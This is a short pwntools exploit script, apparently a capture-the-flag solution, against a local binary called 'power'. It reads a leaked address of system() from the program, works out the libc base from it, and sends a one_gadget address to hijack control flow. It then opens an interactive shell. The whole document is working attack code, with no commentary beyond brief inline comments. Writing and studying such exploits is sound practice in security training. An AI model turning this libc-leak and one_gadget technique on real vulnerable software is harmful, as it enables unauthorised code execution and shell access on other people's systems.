from pwn import *

context.clear(arch="amd64")
LOCATION = "./power"            # position of the binary
LIBC_LOC = "./libc.so.6"        # position of libc
binary = ELF(LOCATION)          # create object with data from the binary
libc   = ELF(LIBC_LOC)          # create object with data from the libc
r = process(LOCATION)           # establish connection with the binary

rop = ROP(LOCATION)

def exploit():
    r.recvuntil(":")
    r.sendline("yes")
    r.recv()
    r.recvuntil("you ")

    libcSystem = int(r.recv(14), base=16)
    log.info("Address of system() in libc is {0}".format(hex(libcSystem)))

    r.recvuntil(":")
    
    relative_system = libc.symbols["system"]
    log.info("Relative address of system() is {0}".format(hex(relative_system)))
    
    libc.address = libcSystem - relative_system
    log.info("Address of libc is {0}".format(hex(libc.address)))
    
    one_gadget = 0x45216 
    log.info("Gadget at {0}" .format(one_gadget))
   
    r.send(p64(one_gadget + libc.address))
    r.interactive()

exploit()
